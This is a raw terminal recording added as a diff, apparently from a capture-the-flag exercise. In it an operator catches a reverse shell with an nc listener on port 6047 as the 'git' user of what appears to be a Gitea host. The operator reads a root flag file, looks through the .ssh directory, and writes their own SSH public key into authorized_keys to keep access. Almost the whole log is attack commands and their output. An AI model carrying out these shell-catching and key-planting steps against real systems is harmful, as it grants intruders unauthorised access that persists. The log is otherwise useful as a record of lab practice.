@@ -1,0 +1,79 @@
+Script started on 2026-10-02 17:28:52+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[K
+[?2004l
+Script done on 2026-10-02 17:44:58+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2026-10-02 17:46:45+03:00 [COMMAND="rlwrap nc -nlvp 6047" TERM="xterm-256color" TTY="/dev/pts/4" COLUMNS="119" LINES="29"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.24.65.71] from (UNKNOWN) [172.24.64.1] 55224
+bash: [Kbash: [Kbash: cannot set terminal process group (14): Not a tty
+bash: no job control in this shell
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ id[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid[Kid[Kid
+uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+HEAD
+branches
+config
+description
+hooks
+info
+objects
+refs
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls /root[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls /root
+[Kls /root[Kls /root[Kls /root
+flag2.txt
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ cat /root/flag2.txt[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /root/flag2.txt
+[Kcat /root/flag2.txt[Kcat /root/flag2.txt[Kcat /root/flag2.txt
+flag{_G0ddamit_Leeroy_}bash-4.4$ [Kflag{_G0ddamit_Leeroy_}bash-4.4$ [K[?2004hflag{_G0ddamit_Leeroy_}bash-4.4$ cd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd
+[Kcd[Kcd[Kcd
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+repositories
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 20
+drwxr-xr-x    4 git      git           4096 Oct  2 14:01 .
+drwxr-xr-x    5 root     root          4096 May 31  2021 ..
+-rw-r--r--    1 git      git             73 Oct  2 14:01 .gitconfig
+drwx------    2 git      git           4096 May 31  2021 .ssh
+drwxr-xr-x    3 git      git           4096 May 31  2021 repositories
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ cd .ssh[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hcd .ssh
+[Kcd .ssh[Kcd .ssh[Kcd .ssh
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ whoam[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoam
+[K[K[?2004hi[K[?2004lwhoam[K[?2004hwhoami[K[?2004l[Kwhoam
+bash: whoam: command not found
+bash-4.4$ [K[?2004hbash-4.4$ i[Kwhoami[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hwhoami
+[Kwhoami[Kwhoami[Kwhoami
+git
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+environment
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ca[K[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 12
+drwx------    2 git      git           4096 May 31  2021 .
+drwxr-xr-x    4 git      git           4096 Oct  2 14:01 ..
+-rw-------    1 git      git             25 May 31  2021 environment
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ cat en        [Kvironment[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hcat environment
+[Kcat environment[Kcat environment[Kcat environment
+GITEA_CUSTOM=/data/gitea
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ echo "[7mssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICR7eZTnRvn1c0xr6Fh4fSeRcupG7nBGk/3o31OXj0CL hatixntsoa@winux[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICR7eZTnRvn1c0xr6Fh4fSeRcupG7nBGk/3o31OXj0CL hatixntsoa@winux" > au thorized_keys[A[?2004l[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[?2004hecho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICR7eZTnRvn1c0xr6Fh4fSeRcupG7nBGk/3o31OXj0CL hatixntsoa@winux" > authorized_keys
+[K[K[K<nBGk/3o31OXj0CL hatixntsoa@winux" > authorized_keys
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ ls -al[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 16
+drwx------    2 git      git           4096 Oct  2 14:53 .
+drwxr-xr-x    4 git      git           4096 Oct  2 14:01 ..
+-rw-r--r--    1 git      git             98 Oct  2 14:53 authorized_keys
+-rw-------    1 git      git             25 May 31  2021 environment
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ cat authorized_keys[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hcat authorized_keys
+[Kcat authorized_keys[Kcat authorized_keys[Kcat authorized_keys
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICR7eZTnRvn1c0xr6Fh4fSeRcupG7nBGk/3o31OXj0CL hatixntsoa@winux
+bash-4.4$ [Kbash-4.4$ [K[?2004hbash-4.4$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[?2004l
+Script done on 2026-10-02 18:14:55+03:00 [COMMAND_EXIT_CODE="0"]
